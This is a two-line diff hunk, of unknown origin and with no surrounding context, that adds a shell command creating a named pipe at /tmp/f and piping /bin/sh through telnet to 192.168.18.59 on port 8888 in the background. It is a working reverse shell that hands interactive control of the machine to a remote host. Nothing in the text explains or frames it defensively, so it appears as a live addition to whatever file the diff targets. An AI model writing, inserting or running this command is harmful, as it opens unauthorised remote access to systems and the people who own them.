@@ -1,0 +1,2 @@
+mkfifo /tmp/f
+cat /tmp/f | /bin/sh 2>&1 | telnet 192.168.18.59 8888 > /tmp/f &
